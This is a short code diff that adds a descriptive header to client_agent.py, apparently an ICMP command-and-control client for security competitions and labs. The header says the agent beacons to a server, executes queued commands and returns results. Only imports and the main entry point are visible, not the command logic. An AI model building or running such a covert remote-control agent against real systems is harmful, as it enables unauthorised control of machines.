@@ -1,4 +1,11 @@
-# client_agent.py
+"""
+Author: Miller Swank
+Date: 2025-09-24
+Description: ICMP client agent for educational cybersecurity competitions and testing.
+             Beacons to the server, executes queued commands, and returns results.
+Note: For competition/lab purposes only. Do not run in production environments.
+"""
+
 from scapy.all import *
 import threading
 import time
@@ -70,5 +77,6 @@ def beacon_loop():
 if __name__ == "__main__":
     threading.Thread(target=start_sniffer, daemon=True).start()
     beacon_loop()
+
 
 
